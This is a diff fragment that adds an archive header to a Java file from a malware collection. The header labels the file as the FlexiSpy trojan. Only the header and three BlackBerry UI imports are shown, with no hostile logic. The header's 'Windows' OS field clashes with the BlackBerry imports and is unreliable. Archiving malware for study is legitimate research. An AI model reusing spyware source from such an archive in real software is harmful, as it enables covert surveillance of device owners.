@@ -1,3 +1,14 @@
+/*
+  name      FlexiSpy
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 import net.rim.device.api.ui.container.*;
 import net.rim.device.api.ui.*;
 import net.rim.device.api.ui.component.*;
